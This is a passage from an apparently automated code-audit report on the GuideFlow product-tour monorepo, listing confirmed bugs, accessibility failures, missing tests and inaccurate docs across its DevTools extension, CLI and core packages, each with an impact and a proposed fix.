  <br>**Impact:** The popup's Record button (`src/popup/popup.tsx:295-301`) sends `GF_START_RECORDING` and then calls `window.close()`. The content script captures clicks and emits `GF_RECORDED_STEP` messages, but the service worker has no handler that stores them — the only sink is `devtoolsPorts.get(tabId)`. With DevTools closed (the entire point of a popup-driven workflow), every recorded step is silently dropped. There is no buffe…
  <br>**Fix:** Add a `recordedSteps` per-tab buffer in the service worker persisted to `chrome.storage.session` (survives popup close and SW suspend), append on `GF_RECORDED_STEP`, expose it via `GF_GET_STATE`, and render a recorded-steps list with Import/Export in popup.tsx. Alternatively disable the popup's Record button until a DevTools panel port ex…
- **`popup-run-sends-non-flow`** — Popup "Run" hands the raw stored record to gf.start(), which expects a FlowDefinition  
  [`packages/devtools/src/popup/popup.tsx:303`](../../packages/devtools/src/popup/popup.tsx#L303) · *bug* · CONFIRMED
  <br>**Impact:** The stored value is what `GF_SAVE_FLOW` wrote: `{ id, name, steps: StepDraft[], savedAt }` (service-worker.ts:173-181 persisting the panel's payload from app.tsx:451). `gf.start()` is `async start(flow: FlowDefinition<TContext>, context?)` and immediately reads `flow.initial`/`flow.states`, both `undefined` here. The bridge wraps the call in try/catch and logs `[GuideFlow bridge] Failed to start tour:` to the page co…
  <br>**Fix:** Store the FlowDefinition (see export-json-wrong-shape) alongside the editable draft, and have the popup send the FlowDefinition. Also propagate the bridge's start failure back as a `GF_TOUR_START_FAILED` message so the popup/panel can show it instead of the page console.
- **`selector-nth-child-not-anchored`** — buildSelector emits an unanchored 4-level :nth-child path that frequently matches the wrong element  
  [`packages/devtools/src/content/inspector.ts:244`](../../packages/devtools/src/content/inspector.ts#L244) · *bug* · CONFIRMED
  <br>**Impact:** The loop stops after 4 ancestors and never anchors the path at `html`, `body`, or `:scope`, so the result is a floating descendant pattern like `div:nth-child(2) > div:nth-child(1) > ul:nth-child(1) > li:nth-child(3)`. In any real app that repeats layout structure (nav + main, card grids, table rows, modal + page duplicating a shell), that pattern matches many nodes and `document.querySelector` picks the first — whic…
  <br>**Fix:** Walk to `document.body`/`document.documentElement` rather than stopping at 4 levels, prefix with `body > ` (or `:scope`), and add a verification loop: build progressively longer paths and return the first for which `document.querySelectorAll(candidate).length === 1`; if none is unique, return the full path and set an `ambiguous: true` fla…
- **`zero-tests`** — The extension has no tests and no `test` script, so `turbo run test` silently skips it in CI  
  [`packages/devtools/package.json:7`](../../packages/devtools/package.json#L7) · *test-coverage* · CONFIRMED
  <br>**Impact:** There is no `test` script, no test file anywhere under `packages/devtools/src`, and no Playwright coverage in apps/e2e that loads the unpacked extension (grepping apps/e2e for "devtools"/"extension" returns nothing). `.github/workflows/ci.yml` runs `pnpm turbo run test`, which finds no `test` task for this package and reports success — so CI is green while every defect in this report ships. Nothing verifies that the …
  <br>**Fix:** Add Vitest unit tests for `buildSelector` (uniqueness, nth-child anchoring, shadow DOM) against jsdom fixtures, a build-output assertion test (every path in manifest.json exists in dist, content.js has no top-level import), and a Playwright test in apps/e2e using `chromium.launchPersistentContext` with `--load-extension=packages/devtools/…

#### CLI & studio (10)

- **`cli-exports-no-types`** — package.json advertises a programmatic `exports` entry but tsup has dts:false, so consumers get no types  
  [`packages/cli/package.json:34`](../../packages/cli/package.json#L34) · *packaging* · CONFIRMED
  <br>**Impact:** `packages/cli/tsup.config.ts:5` sets `dts: false`, and there is no `types`/`typings` field, so `import { PushOptions } from '@guideflow/cli'` resolves to an untyped module. `push.ts:8` exports `PushOptions` publicly, and the demo had to hand-duplicate it: `apps/demo/src/App.tsx:27` reads `/** Mirrors PushOptions from @guideflow/cli (which ships no .d.ts currently). */` followed by a copy of the interface — while apps…
  <br>**Fix:** Either drop the `exports` map entirely (it is a bin-only package) and keep `bin` only; or, if a programmatic API is intended, split `src/api.ts` from `src/index.ts` (bin), point `exports["."]` at the API entry with `types`, and set `dts: true` in tsup.config.ts:5.
- **`cli-zero-tests`** — @guideflow/cli has no tests and no test script — every command is unverified  
  [`packages/cli/package.json:44`](../../packages/cli/package.json#L44) · *test-coverage* · CONFIRMED
  <br>**Impact:** There is no `test` script, no `__tests__` directory (core, react, ai and analytics all have `src/__tests__`), and `apps/e2e/tests` covers only browser tour behaviour (accessibility, spotlight-persistence, tour-flow). Root `pnpm test` -> `turbo run test` therefore skips the CLI entirely. Every defect in this report is the kind a single test would have caught: one assertion that `export foo.json` does not write to `foo…
  <br>**Fix:** Add `"test": "vitest run"` and `packages/cli/src/commands/__tests__/` with unit tests that import each `Command` and call `.parseAsync([...], {from:'user'})` against a temp dir (the commands are already exported as standalone `Command` objects, so this needs no refactor). Cover: export output-path derivation, export refusing to overwrite …
- **`docs-cli-flags-do-not-exist`** — apps/docs/api/cli.md documents an entirely fictional flag set for export and push  
  [`apps/docs/api/cli.md:82`](../../apps/docs/api/cli.md#L82) · *docs* · CONFIRMED
  <br>**Impact:** None of `--flow`, `--out`, or `--config` exist. `export.ts:19-21` defines only `[file]`, `-o, --output <file>`, and `--pretty`. There is no `--flow` (the command cannot select a flow by id at all) and no config-file support anywhere in the package. The same section for push (apps/docs/api/cli.md:101-108) documents `--flow <id>`, `--api <url>`, `--token <token>` and `export GUIDEFLOW_TOKEN=my-secret-token`; push.ts:23…
  <br>**Fix:** Rewrite apps/docs/api/cli.md sections `guideflow export` (lines 71-88) and `guideflow push` (lines 91-109) against the actual Commander definitions in export.ts:17-21 and push.ts:21-26, including the positional `[file]` arguments and their defaults (`my-tour.ts`, `my-tour.flow.json`). Fix the init file list at lines 32-35. Add a CI check …
- **`export-overwrites-json-source-file`** — `guideflow export foo.json` overwrites the user's input file in place, minified  
  [`packages/cli/src/commands/export.ts:59`](../../packages/cli/src/commands/export.ts#L59) · *bug* · CONFIRMED
  <br>**Impact:** `.json` is an accepted input extension (line 33), but the regex `/\.(ts|js)$/` does not match a path ending in `.json`. So for `guideflow export my-tour.json` with no `-o`, `outPath === src`. The file is read (line 34), `JSON.parse`d, and re-`JSON.stringify`d back over itself — and because `--pretty` defaults to `false` (line 21), the user's hand-formatted, version-controlled flow JSON is destructively minified to a …
  <br>**Fix:** In export.ts:59 compute the default output as `src.replace(/\.(ts|js|json)$/, '') + '.flow.json'`, and add an explicit guard: if `resolve(outPath) === src`, error out. Add an `existsSync(outPath)` check that requires `--force` (or prompts) before overwriting any existing file.
- **`guideflow-config-ts-documented-never-exists`** — `guideflow.config.ts` is documented in three places as the thing `init` creates, but no config file is ever written or read  
  [`README.md:533`](../../README.md#L533) · *docs* · CONFIRMED
  <br>**Impact:** The same claim appears at packages/cli/README.md:24 and the file name is used as a documented default at apps/docs/api/cli.md:83 (`| `--config <file>` | `guideflow.config.ts` | Path to the GuideFlow config file |`). `init.ts:95-99` writes `guideflow.ts`, `my-tour.ts`, and `GuideFlowProvider.tsx` — never `guideflow.config.ts`. A repo-wide grep finds no reader for such a file in any package. So there is no project-leve…
  <br>**Fix:** Pick one: (a) delete the `guideflow.config.ts` claim from README.md:533, packages/cli/README.md:24 and apps/docs/api/cli.md:83 and rename the scaffolded file references to `guideflow.ts`; or (b) implement it — a `loadConfig()` helper (cosmiconfig/jiti) resolving `guideflow.config.{ts,js,mjs,json}` upward from cwd, supplying defaults for `…
- **`init-always-prompts-breaks-ci`** — `init` always prompts for the output directory, so it can never run non-interactively even with every flag supplied  
  [`packages/cli/src/commands/init.ts:80`](../../packages/cli/src/commands/init.ts#L80) · *bug* · CONFIRMED
  <br>**Impact:** The framework question has `when: !opts.framework` (line 78) but the outputDir question has no `when`, so it is always asked. `guideflow init --dir ./src --framework react` — a fully specified invocation — still blocks on a prompt. In a non-TTY context (CI, Docker build, `npx` inside a script, an agent harness) inquirer's input prompt has no stdin to read and the command hangs or throws, and there is no `--yes`/`--no…
  <br>**Fix:** Add `when: !opts.dir || opts.dir === '.'` is not sufficient since `.` is the default — instead detect whether `--dir` was explicitly passed (Commander's `initCommand.getOptionValueSource('dir') === 'cli'`) and skip the prompt, and short-circuit the whole `inquirer.prompt` call when `!process.stdin.isTTY` or `--yes` is present, falling bac…
- **`init-clobbers-existing-files`** — `init` overwrites existing guideflow.ts / my-tour.ts / GuideFlowProvider.tsx with no check or prompt  
  [`packages/cli/src/commands/init.ts:95`](../../packages/cli/src/commands/init.ts#L95) · *bug* · CONFIRMED
  <br>**Impact:** `existsSync` is imported (line 1) and used for the directory (line 91) but never for the files. Re-running `guideflow init` — or running it in a directory that happens to contain a `guideflow.ts` — silently destroys the user's customised configuration and tour, then prints `✓ GuideFlow initialized!`. This is the documented workflow for "an existing project" (apps/docs/api/cli.md:24 "Scaffolds GuideFlow configuration …
  <br>**Fix:** Guard each write: if the target exists, skip it and report `- skipped guideflow.ts (already exists)`, or prompt via the inquirer instance already imported. Add `--force` to opt into overwriting and `--dry-run` to preview. Track which files were actually written so the summary at lines 103-108 does not claim files it skipped.
- **`init-vue-svelte-scaffold-nothing`** — `init --framework vue` / `svelte` silently scaffolds no framework code and reports success  
  [`packages/cli/src/commands/init.ts:98`](../../packages/cli/src/commands/init.ts#L98) · *missing-implementation* · CONFIRMED
  <br>**Impact:** The prompt at lines 74-79 offers `['react', 'vue', 'svelte', 'none']` and the `--framework` help at line 67 advertises `react | vue | svelte | none`, but only `REACT_TEMPLATE` exists in the file (there is no VUE_TEMPLATE or SVELTE_TEMPLATE). A Vue user selecting `vue` gets exactly the same two files as `none`, plus a success banner and `pnpm add @guideflow/core @guideflow/vue` (line 112) — with no wrapper, no plugin …
  <br>**Fix:** Add VUE_TEMPLATE (using the `app.use(...)` plugin from packages/vue/src/plugin.ts) and SVELTE_TEMPLATE, and dispatch on `framework` with a `default:` branch. Validate the flag against the allowed set at the top of the action and exit with a clear error otherwise (Commander's `.choices([...])` on the option does this declaratively).
- **`push-hardcoded-nonexistent-saas`** — `push` defaults to https://api.guideflow.dev/v1/flows — a service with no implementation, no signup path, and no documented key issuance  
  [`packages/cli/src/commands/push.ts:25`](../../packages/cli/src/commands/push.ts#L25) · *gap* · CONFIRMED
  <br>**Impact:** The default endpoint is the only default a first-time user will hit. Nothing in the monorepo implements or deploys this API: a grep for `guideflow.dev` yields only this line, a marketing link in `packages/devtools/src/popup/popup.tsx:501`, a banner comment in `packages/core/tsup.config.ts:17`, and hardcoded copies in `apps/demo/src/App.tsx:178,783,843`. There is no server package, no OpenAPI spec, no request/response…
  <br>**Fix:** Remove the default so `--endpoint` is required, and error with "GuideFlow Cloud is not yet available — pass --endpoint for your self-hosted API" when omitted. Document the expected POST contract (headers `Authorization: Bearer`, `X-GuideFlow-Env`; request body = FlowDefinition JSON; response `{id, url}`) so self-hosting is actually implem…
- **`push-requiredoption-kills-env-var`** — `--api-key` is a requiredOption, making the documented GUIDEFLOW_API_KEY env-var path unreachable dead code  
  [`packages/cli/src/commands/push.ts:24`](../../packages/cli/src/commands/push.ts#L24) · *bug* · CONFIRMED
  <br>**Impact:** Commander aborts with `error: required option '-k, --api-key <key>' not specified` and exit code 1 *before* the action handler runs. Therefore push.ts:35 `const apiKey: string = opts.apiKey || process.env['GUIDEFLOW_API_KEY'] || '';` can never see an empty `opts.apiKey`, and the guard at lines 36-39 (`Error: API key is required. Pass --api-key or set GUIDEFLOW_API_KEY.`) is unreachable. Concretely: `GUIDEFLOW_API_KEY…
  <br>**Fix:** Change push.ts:24 to `.option('-k, --api-key <key>', 'API key (or set GUIDEFLOW_API_KEY env var)')` — Commander's `.env()` (v12: `.option(...).env('GUIDEFLOW_API_KEY')`) does this natively — and keep the runtime guard at lines 36-39 as the real enforcement point.

#### Accessibility / i18n / UX (13)

- **`arrow-keys-break-inputs`** — Document-level keyboard handler preventDefaults arrow keys with no check for editable fields, native controls, or IME composition  
  [`packages/core/src/engine/tour.ts:324`](../../packages/core/src/engine/tour.ts#L324) · *bug* · CONFIRMED
  <br>**Impact:** There is no inspection of `e.target`, `e.isComposing`, `e.defaultPrevented`, or `contentEditable` anywhere in this handler, and it is registered on `document` (line 343) for the entire lifetime of the tour. On a `clickThrough: true` step — the documented pattern for "Try clicking the button" / "type your project name here" (apps/docs/guide/spotlight-popover.md) — a user typing in a text input cannot move the caret: p…
  <br>**Fix:** At the top of the handler, bail out when `e.isComposing || e.defaultPrevented`, and when `e.target` matches `input, textarea, select, [contenteditable]:not([contenteditable="false"])` or has a role of textbox/combobox/listbox/slider/spinbutton/menu/grid. Restrict arrow-key navigation to events whose target is inside the popover, or gate t…
- **`dangling-aria-labelledby`** — aria-labelledby/aria-describedby are emitted unconditionally but the referenced elements are conditional — a step without a title has no accessible name  
  [`packages/core/src/renderer/default-renderer.ts:96`](../../packages/core/src/renderer/default-renderer.ts#L96) · *a11y* · CONFIRMED
  <br>**Impact:** Line 174 emits the title only when `content.title` is truthy: `${content.title ? `<h2 class="gf-popover-title" id="${this._popoverId}-title">…` : '<span></span>'}` — and lines 177-181 emit the `-body` id only when `content.body` or `content.html` exist. A perfectly legal step such as `{ id: 's1', content: { body: 'Click here to continue' } }` therefore produces `<div role="dialog" aria-modal="true" aria-labelledby="g…
  <br>**Fix:** Only set `aria-labelledby`/`aria-describedby` when the corresponding element is actually rendered; when there is no title, fall back to `aria-label` populated from an i18n key (e.g. a new `tourStep` string) or from the `stepOf` progress text. Add a regression test rendering `{ content: { body: 'x' } }` and asserting the computed accessibl…
- **`default-button-contrast-fails`** — Default primary button and all muted-opacity text fail WCAG AA contrast in both light and dark tokens  
  [`packages/core/src/styles/tokens.css:11`](../../packages/core/src/styles/tokens.css#L11) · *a11y* · CONFIRMED
  <br>**Impact:** `.gf-btn-primary { background: var(--gf-accent-color); color: var(--gf-accent-fg); }` renders #ffffff on #6366f1 at `font-size: 13px; font-weight: 500` — relative luminance 0.1851, contrast ratio 4.47:1, below the 4.5:1 required by WCAG 1.4.3 for normal-size text. The Next/Done button, the single most important control in the library, fails out of the box. Worse are the opacity-dimmed elements: `default-renderer.ts:5…
  <br>**Fix:** Darken the default accent to at least #4f46e5 (contrast 5.5:1 with white) or set `--gf-accent-fg` explicitly per theme after verifying the pair. Replace every `opacity:` dimming on text/controls with an explicit token colour chosen to meet 4.5:1 (e.g. `--gf-text-muted: #4b5563`), in both `default-renderer.ts`'s inlined POPOVER_CSS and `st…
- **`e2e-a11y-suite-cannot-run`** — The entire accessibility e2e suite is non-executable: wrong axe package, wrong baseURL, and an invalid flow shape in the fixture  
  [`apps/e2e/tests/accessibility.spec.ts:2`](../../apps/e2e/tests/accessibility.spec.ts#L2) · *test-coverage* · CONFIRMED
  <br>**Impact:** Three independent breakages, any one of which kills the suite. (1) `axe-playwright@2.2.2` (the version actually installed, per apps/e2e/node_modules/axe-playwright/package.json) exports only `injectAxe`, `configureAxe`, `getAxeResults`, `getViolations`, `reportViolations`, `checkA11y`, `DefaultTerminalReporter` — there is no default export and no `AxeBuilder`, so `new AxeBuilder({ page })` on lines 10 and 20 throws `…
  <br>**Fix:** Swap the dependency to `@axe-core/playwright` and import `{ AxeBuilder }`. Add a dedicated Playwright project (or a second `webServer`) that serves `apps/e2e/fixtures/` with a bundler so the `import '…/styles/index.css'` statement resolves, and point its `baseURL` there. Rewrite the fixture flow into the real `{ id, initial, states: { … }…
- **`i18n-docs-nonexistent-api`** — apps/docs/guide/i18n.md documents an i18n API that does not exist — setLocale(), arbitrary keys, and first-registered-locale fallback are all fictional  
  [`apps/docs/guide/i18n.md:38`](../../apps/docs/guide/i18n.md#L38) · *docs* · CONFIRMED
  <br>**Impact:** `I18nRegistry` (packages/core/src/i18n/index.ts) has no `setLocale` method — the real one is `use(locale)`, line 37. Following the documented example throws `TypeError: gf.i18n.setLocale is not a function`. The whole page is wrong in four further ways: (1) it registers arbitrary keys like `'tour.welcome.title'` and `'btn.next'`, but `Locale` is a fixed 8-field interface (`next|prev|close|skip|stepOf|done|openHint|clo…
  <br>**Fix:** Rewrite apps/docs/guide/i18n.md against the real surface: `register(locale, Partial<Locale>)`, `use(locale)`, `t(key: keyof Locale, vars?)`, `activeLocale`, `getLocale(locale?)`. Enumerate the eight real keys. State that fallback is always to built-in English. Remove the arbitrary-key examples entirely, or implement free-form keys in `I18…
- **`no-focus-trap-or-restore`** — role=dialog aria-modal=true with no focus trap, no focus restoration, and no inert/aria-hidden on the background  
  [`packages/core/src/renderer/default-renderer.ts:121`](../../packages/core/src/renderer/default-renderer.ts#L121) · *a11y* · CONFIRMED
  <br>**Impact:** This is the entire focus implementation. `grep -rn "inert\|aria-hidden\|activeElement\|focus-trap"` over packages/ and apps/ returns zero hits in source. A sighted keyboard user opens a 3-step tour, presses Tab four times (Close → Skip → Back → Next), and the fifth Tab lands on a control in the dimmed page behind the overlay — a control the overlay intercepts clicks for, so the focus ring is visible on an element tha…
  <br>**Fix:** In `DefaultRenderer.renderStep`, capture `document.activeElement` before focusing; add a `keydown` handler on the popover that wraps Tab/Shift+Tab across the focusable list; and set `inert` (with an `aria-hidden="true"` fallback) on every direct child of `document.body` except the popover and overlay while a step is shown. Restore the sav…
- **`no-live-region`** — Step changes are never announced — no live region, and the core renderer's focus target is the Close button  
  [`packages/core/src/renderer/default-renderer.ts:93`](../../packages/core/src/renderer/default-renderer.ts#L93) · *a11y* · CONFIRMED
  <br>**Impact:** `grep -rn "aria-live\|role=\"status\"\|role=\"alert\"" packages/ apps/` returns no hits in source. On `next()`, the existing dialog element is kept and its `innerHTML` is replaced wholesale; the `role="dialog"` node itself never leaves the accessibility tree, so no AT boundary event fires. Screen-reader users therefore get silence when the tour advances. The only compensating mechanism is the focus move at line 125, …
  <br>**Fix:** Render an `aria-live="polite"` `role="status"` visually-hidden region (created once, outside the dialog) and write `"{stepOf}: {title}. {body}"` into it on each `step:enter`. Change the initial focus target to the dialog container itself (`tabIndex={-1}`) so the accname (title) plus `aria-describedby` (body) are read, or to the primary Ne…
- **`no-reduced-motion-guard`** — No prefers-reduced-motion guard exists anywhere in the codebase  
  [`packages/core/src/renderer/default-renderer.ts:40`](../../packages/core/src/renderer/default-renderer.ts#L40) · *a11y* · CONFIRMED
  <br>**Impact:** `grep -rn "prefers-reduced-motion" packages/ apps/` returns no hits outside a checklist markdown file. Every animated surface runs unconditionally: the popover scale+translate entry animation above and its duplicate at `packages/core/src/styles/popover.css:154-159`; the infinite pulse in `packages/core/src/engine/hotspot.ts:14-18` (`animation: gf-pulse 2s … infinite` at line 30, a permanently moving 2x-scale beacon);…
  <br>**Fix:** Add `@media (prefers-reduced-motion: reduce) { .gf-popover, .gf-popover[data-enter], .gf-progress-bar-fill, [data-gf-spotlight-cutout], .gf-hint-badge { animation: none !important; transition: none !important; } .gf-hotspot-beacon { animation: none; } }` to popover.css, the renderer's inlined POPOVER_CSS, hotspot.ts's HOTSPOT_CSS and spot…
- **`popover-drifts-on-scroll`** — The popover is positioned once and never repositioned on scroll, so it detaches from the spotlight  
  [`packages/core/src/renderer/default-renderer.ts:119`](../../packages/core/src/renderer/default-renderer.ts#L119) · *bug* · CONFIRMED
  <br>**Impact:** This is the only call site of `_position`, invoked once inside `renderStep`. `DefaultRenderer` registers no `scroll`, `resize`, or `ResizeObserver` listener anywhere in the file, and there is no scroll lock in the library (`grep -rn "overflow\|body.style" packages/core/src packages/react/src` finds only unrelated hits). Meanwhile `SpotlightOverlay._attachObservers` (spotlight.ts:208-222) *does* track scroll and resiz…
  <br>**Fix:** Attach `window.addEventListener('scroll', reposition, { passive: true, capture: true })` plus a `ResizeObserver` on the target in `renderStep`, tearing both down in `hideStep()`; reuse the pattern already in `SpotlightOverlay._attachObservers`. Add the scroll listener to the React `useEffect` at GuidePopover.tsx:105. Separately, add an op…
- **`react-popover-never-focuses`** — React <GuidePopover> never moves focus into the dialog at all  
  [`packages/react/src/components/GuidePopover.tsx:120`](../../packages/react/src/components/GuidePopover.tsx#L120) · *a11y* · CONFIRMED
  <br>**Impact:** GuidePopover.tsx contains no `.focus()` call, no `autoFocus`, and no focus-management `useEffect` — only the two positioning effects at lines 101-108. When a React tour starts, the dialog is portalled into `document.body` while focus stays on whatever button the user clicked to start the tour. A screen-reader user hears nothing: there is no live region and no focus move, so the popover is silently inserted and the vi…
  <br>**Fix:** Add a `useEffect` keyed on `activeStep.step.id` that focuses the popover container (`tabIndex={-1}` on the wrapper) or the primary action button, saves the prior `document.activeElement`, and restores it in the cleanup. Share the implementation with the core renderer rather than duplicating it.
- **`rtl-double-flip`** — rtl.css applies flex-direction: row-reverse inside a dir=rtl container, double-reversing the footer back into LTR order  
  [`packages/core/src/styles/rtl.css:2`](../../packages/core/src/styles/rtl.css#L2) · *bug* · CONFIRMED
  <br>**Impact:** `flex-direction: row` is already direction-relative: inside a `dir="rtl"` subtree, the main axis runs right-to-left automatically, so `.gf-popover-actions` (Skip, Back, Next) already lays out correctly with no CSS at all. Explicitly setting `row-reverse` reverses it a second time, producing left-to-right visual order in an RTL document — the exact opposite of the file's stated purpose. In an Arabic or Hebrew UI the N…
  <br>**Fix:** Delete the `row-reverse` rules — logical flex ordering already handles RTL. Replace the `.gf-hint-badge` no-op with real logical positioning (compute the badge offset from the target's inline-start edge when `getComputedStyle(document.documentElement).direction === 'rtl'`). Add an RTL story to Storybook rendering the popover under `dir="r…
- **`theme-docs-fictional-tokens`** — Theming docs list CSS custom properties and class names that do not exist in any stylesheet  
  [`apps/docs/themes/custom.md:16`](../../apps/docs/themes/custom.md#L16) · *docs* · CONFIRMED
  <br>**Impact:** Cross-checked against `packages/core/src/styles/tokens.css` (the only token definition), none of these exist. The real names are `--gf-popover-text`, `--gf-border-radius`, `--gf-shadow`, `--gf-spacing`. `--gf-popover-padding`, `--gf-popover-max-width`, `--gf-popover-font`, `--gf-popover-backdrop`, `--gf-btn-primary-bg`, `--gf-btn-primary-color`, `--gf-btn-secondary-bg`, `--gf-btn-secondary-color`, `--gf-btn-border-ra…
  <br>**Fix:** Regenerate apps/docs/themes/custom.md and each apps/docs/themes/*.md directly from `packages/core/src/styles/tokens.css` and `themes.css` — same names, same defaults, `.gf-popover` selectors. Add a CI check that greps every `--gf-*` identifier in apps/docs/** and fails if it is not defined in tokens.css.
- **`theme-docs-nonexistent-import-path`** — Every theme page tells users to import a per-theme CSS file that is not shipped, and the real activation mechanism is undocumented  
  [`apps/docs/themes/index.md:26`](../../apps/docs/themes/index.md#L26) · *docs* · CONFIRMED
  <br>**Impact:** `packages/core/src/styles/` contains exactly seven files — index, tokens, popover, themes, dark, rtl, high-contrast — and the build step is `cp -r src/styles dist/styles` (packages/core/package.json build script), so `dist/styles/themes/minimal.css` never exists. The `./styles/*` export maps to `./dist/styles/*`, so the documented import is an unresolvable module specifier: the user's bundler fails the build. The fiv…
  <br>**Fix:** Replace the import snippet on every apps/docs/themes/*.md page with the real usage — `import '@guideflow/core/styles'` plus `<html data-gf-theme="minimal">` (or setting the attribute on any ancestor of the popover, noting the popover is portalled to document.body so the attribute must go on `:root`). Either that, or split themes.css into …

#### Docs & tests (25)

- **`ai-generate-options-arg-fabricated`** — ai-generate guide documents an options object as generate()'s second argument; it is a DOM root  
  [`apps/docs/guide/ai-generate.md:55`](../../apps/docs/guide/ai-generate.md#L55) · *docs* · CONFIRMED
  <br>**Impact:** packages/ai/src/brain.ts:103 is `async generate(prompt = '', root?: Element | null)` and passes that argument straight to `serializeDOM(root)`. There is no `maxSteps` and no `placement` option anywhere in the AI package. At runtime the plain object is treated as a DOM root; `serializeDOM` calls `root.querySelectorAll(...)` on it and throws `TypeError: root.querySelectorAll is not a function`. The neighbouring page ap…
  <br>**Fix:** Delete the "Custom Generation Options" section from ai-generate.md, or implement it: add a third `GenerateOptions` parameter to `GuideBrain.generate` and honour `maxSteps`/`placement` in `validateSteps`. Whichever way, make ai-generate.md and ai.md agree.
- **`analytics-event-names-wrong`** — Analytics guide lists three event names the collector never emits and omits two it does  
  [`apps/docs/guide/analytics.md:31`](../../apps/docs/guide/analytics.md#L31) · *docs* · CONFIRMED
  <br>**Impact:** packages/analytics/src/collector.ts emits exactly six events: `guideflow.tour.started` (:62), `.completed` (:65), `.abandoned` (:70), `guideflow.step.viewed` (:74), `.exited` (:79), `.skipped` (:82). The guide's table invents `guideflow.tour.skipped` (:31), `guideflow.step.completed` (:34) and `guideflow.step.abandoned` (:35), and omits the real `guideflow.tour.abandoned` and `guideflow.step.skipped`. A team building…
  <br>**Fix:** Replace the table in apps/docs/guide/analytics.md:27-35 with the six names emitted by collector.ts, matching README.md:341-348. Add a unit test that asserts the emitted event-name set equals a frozen constant so the docs table can be generated from it.
- **`bundle-size-claim-exceeded`** — README advertises ~12 kB gzip for core; the built bundle is 14.6 kB and would fail the size-limit gate  
  [`README.md:40`](../../README.md#L40) · *docs* · CONFIRMED
  <br>**Impact:** packages/core/package.json:73-79 sets `size-limit` to `{ path: './dist/index.js', limit: '12 kB', gzip: true }`. The bundle currently produced by `pnpm --filter @guideflow/core build` is 63,663 bytes raw / 14,954 bytes gzipped — 24% over the declared limit, so `pnpm size` fails today. The overshoot is partly explained by `packages/core/tsup.config.ts:12` setting `minify: false`, meaning the published ESM/CJS/IIFE art…
  <br>**Fix:** Set `minify: true` in packages/core/tsup.config.ts (keeping sourcemaps) and re-measure; then align README.md:40 and the size-limit `limit` with the real number. Add a `size` step to ci.yml so the budget is enforced. Populate the per-package size column, or drop the column rather than shipping seven em-dashes.
- **`cli-export-emits-stub`** — `guideflow export` does not export TypeScript flows — it writes a placeholder object  
  [`packages/cli/src/commands/export.ts:232`](../../packages/cli/src/commands/export.ts#L232) · *missing-implementation* · CONFIRMED
  <br>**Impact:** For `.ts`/`.js` input — the default (`.argument('[file]', ..., 'my-tour.ts')`, line 204) — the command never parses the flow. It regex-matches the first 500 characters and writes `{_note, rawSnippet}` to disk, then prints `✓ Exported flow to <path>` in green. The output is not a `FlowDefinition` and cannot be consumed by `guideflow push`, by the DevTools extension, or by anything else the file's own docblock (lines 1…
  <br>**Fix:** Either implement real extraction (import the module with `jiti`/`tsx` and serialise the exported FlowDefinition) or make the failure loud: exit non-zero for `.ts`/`.js` with a message directing users to `.json`, and change the success line so it is not printed for stub output. Update README.md:535 and apps/docs/api/cli.md:71-87 to state t…
- **`cli-studio-not-an-editor`** — `guideflow studio` is documented as a visual tour editor that opens a browser; it is neither  
  [`packages/cli/src/commands/studio.ts:78`](../../packages/cli/src/commands/studio.ts#L78) · *docs* · CONFIRMED
  <br>**Impact:** README.md:534 says "Launch the visual tour editor (opens browser)" and apps/docs/api/cli.md:48 says "Launches a local visual tour editor powered by Vite and the GuideFlow DevTools panel". The implementation starts a plain Vite dev server on the user's project root with `open: false` (so no browser opens) and injects one line — `window.__GUIDEFLOW_DEVTOOLS__ = true` (studio.ts:87). Nothing reads that flag in packages/…
  <br>**Fix:** Change README.md:534 and apps/docs/api/cli.md:46-67 to describe what it does ("serves your app with the GuideFlow DevTools bridge enabled — requires the DevTools extension, which is unpublished"), and set `open: true` if opening the browser is intended. Mark the command experimental until an editor exists.
- **`cross-tab-sync-overclaimed`** — Docs claim cross-tab sync works automatically, but BroadcastSync is only created on a resumed tour  
  [`apps/docs/guide/persistence.md:76`](../../apps/docs/guide/persistence.md#L76) · *docs* · CONFIRMED
  <br>**Impact:** In packages/core/src/index.ts the only assignment to `_broadcastSync` is at line 254, inside `if (snapshot && !snapshot.completed)` — which itself sits inside `if (userId)`. So the channel is created only when a user has a *previously saved, incomplete* snapshot at start time. On a first-ever tour, or any tour without `context.userId`, `_broadcastSync` stays `null` and `_saveProgress`'s `_broadcastSync?.broadcast(...…
  <br>**Fix:** Create `BroadcastSync` unconditionally whenever `_config.context?.userId` is set (move it out of the snapshot branch in packages/core/src/index.ts), and tear it down in `destroy()`. Add packages/core/src/__tests__/create-guide-flow.test.ts covering: fresh start with userId creates the channel, dismissed flows are skipped, and an incomplet…
- **`e2e-not-in-ci`** — Playwright suite is explicitly excluded from CI and no other workflow runs it  
  [`.github/workflows/ci.yml:45`](../../.github/workflows/ci.yml#L45) · *test-coverage* · CONFIRMED
  <br>**Impact:** `--filter=!e2e` removes the only browser-level tests from every push and PR. There is no separate e2e workflow (`.github/workflows/` contains only ci.yml, docs.yml, release.yml). Combined with the fixture misconfiguration above, the suite has almost certainly never passed, and nobody would notice: CI stays green while the integration layer (real DOM positioning, real spotlight, real localStorage persistence, real key…
  <br>**Fix:** Add a dedicated e2e job to ci.yml that runs `pnpm --filter e2e exec playwright install --with-deps chromium` then `pnpm --filter e2e test`, gated on the fixture fix. Also rename the e2e package script from `test` to `test:e2e` so the root `pnpm test:e2e` (`turbo run test:e2e`) actually resolves — today it matches no script in any package …
- **`e2e-suite-cannot-run`** — Entire Playwright e2e suite targets a page that is never served — every test fails  
  [`apps/e2e/playwright.config.ts:33`](../../apps/e2e/playwright.config.ts#L33) · *bug* · CONFIRMED
  <br>**Impact:** `baseURL` is `http://localhost:6006` and the only server started is Storybook. All 16 tests across the three specs do `await page.goto('/')` and then `await page.click('#start-btn')`. Storybook's root URL renders the manager shell — there is no `#start-btn`, no `.gf-popover`, and no `window.__guideflow` in that document (the story lives inside an iframe at `/iframe.html?id=...`). Meanwhile `apps/e2e/fixtures/index.ht…
  <br>**Fix:** Serve the fixture: add `apps/e2e/fixtures` as a static root (e.g. `webServer.command: 'pnpm exec vite --port 6006 fixtures'` with a vite config aliasing `@guideflow/core` to `packages/core/dist`), or repoint every `page.goto('/')` to the Storybook iframe URL for the `Core/TourFlow` story. Delete whichever of `fixtures/index.html` / Storyb…
- **`guide-brain-doc-signatures-wrong`** — GuideBrain API reference documents a stopWatch() method that does not exist and gets three signatures wrong  
  [`apps/docs/api/ai/guide-brain.md:68`](../../apps/docs/api/ai/guide-brain.md#L68) · *docs* · CONFIRMED
